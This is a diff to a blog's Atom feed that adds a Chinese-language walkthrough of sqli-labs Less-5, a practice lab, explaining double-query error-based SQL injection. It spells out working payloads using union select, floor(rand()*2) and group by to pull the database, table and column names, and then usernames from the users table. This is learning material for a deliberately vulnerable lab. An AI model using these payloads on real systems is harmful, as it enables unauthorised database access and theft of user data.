@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://lovectrl-tan.github.io</id>
     <title>LoveCtrl-Tan</title>
-    <updated>2019-10-19T14:50:03.978Z</updated>
+    <updated>2019-10-25T03:42:28.110Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://lovectrl-tan.github.io"/>
     <link rel="self" href="https://lovectrl-tan.github.io/atom.xml"/>
@@ -10,6 +10,64 @@
     <logo>https://lovectrl-tan.github.io/images/avatar.png</logo>
     <icon>https://lovectrl-tan.github.io/favicon.ico</icon>
     <rights>All rights reserved 2019, LoveCtrl-Tan</rights>
+    <entry>
+        <title type="html"><![CDATA[Less-5]]></title>
+        <id>https://lovectrl-tan.github.io/post/di-wu-guan</id>
+        <link href="https://lovectrl-tan.github.io/post/di-wu-guan">
+        </link>
+        <updated>2019-10-23T13:04:35.000Z</updated>
+        <summary type="html"><![CDATA[<p>惯例，我们来查看提示<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191023210657.png" alt=""></p>
+<h2 id="双查询报错注入">双查询报错注入</h2>
+<p>需要用到四个函数和一个<code>group by</code>语句<br>
+1.<code>group by ...</code>-&gt;分组语句//将查询的结果分类汇总<br>
+2.<code>rand()</code>-&gt;随机数生成函数<br>
+3.<code>floor()</code>-&gt;取整函数//用来对生成的随机数取整<br>
+4.<code>concat()</code>-&gt;连接字符串<br>
+5.<code>count()</code>-&gt;统计函数//结合group by 语句统计分组后的数据</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>惯例，我们来查看提示<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191023210657.png" alt=""></p>
+<h2 id="双查询报错注入">双查询报错注入</h2>
+<p>需要用到四个函数和一个<code>group by</code>语句<br>
+1.<code>group by ...</code>-&gt;分组语句//将查询的结果分类汇总<br>
+2.<code>rand()</code>-&gt;随机数生成函数<br>
+3.<code>floor()</code>-&gt;取整函数//用来对生成的随机数取整<br>
+4.<code>concat()</code>-&gt;连接字符串<br>
+5.<code>count()</code>-&gt;统计函数//结合group by 语句统计分组后的数据</p>
+<!-- more -->
+<p>我们先了解以下子查询的概念</p>
+<pre><code class="language-txt">子查询又称为内部查询，子查询允许吧一个查询嵌套在另一个查询当中
+</code></pre>
+<p>我们知道他想考察双注入单引号的类型，我们输入参数<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191023210901.png" alt=""><br>
+发现它跟之前的返回不同了照例判断是否存在注入漏洞<code>?id=1' and 1=1--+</code> <code>?id=1' and 1=2--+</code><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191023211004.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191023211012.png" alt=""><br>
+我们接着来查询字段数<code>order by</code><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025105025.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025105039.png" alt=""><br>
+接着我们只用双注入查询数据库名</p>
+<pre><code>?id=-1' union select 1,count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a--+
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025112717.png" alt=""><br>
+我们去掉随机数即是库名，注意，由于有随机性，可能成功执行了语句所以不会报错，即显示正常，我们多提交几遍就可以了</p>
+<!-- more -->
+<p>接着我们继续查询表名</p>
+<pre><code>?id=-1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand()*2))as a from information_schema.tables group by a--+
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025113147.png" alt=""><br>
+查询字段名</p>
+<pre><code>?id=-1' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 3,1),floor(rand()*2))as a from information_schema.tables group by a--+
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025113752.png" alt=""><br>
+现在我们库名，表名和字段名都知道啦，我们构造以下语句来查询数据</p>
+<pre><code>?id=-1%27 union select 1,count(*),concat((select username from security.users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a--+
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025113920.png" alt=""><br>
+剩下语法相似，我就不一一描述</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[DVWA]]></title>
         <id>https://lovectrl-tan.github.io/post/dvwa</id>
@@ -32,6 +90,7 @@
 <li><a href="https://lovectrl-tan.github.io/post/di-er-guan/">GET-Error based-intiger based Less-2</a></li>
 <li><a href="https://lovectrl-tan.github.io/post/di-san-guan/">GET-Error bases-Single quotes with twist-string Less-3</a></li>
 <li><a href="https://lovectrl-tan.github.io/post/di-si-guan/">GET -Error based-Double Quotes-String Less-4</a></li>
+<li><a href="https://lovectrl-tan.github.io/post/di-wu-guan/">GET - Double injection-Single Quotes-String Less-5</a></li>
 </ul>
 ]]></content>
     </entry>
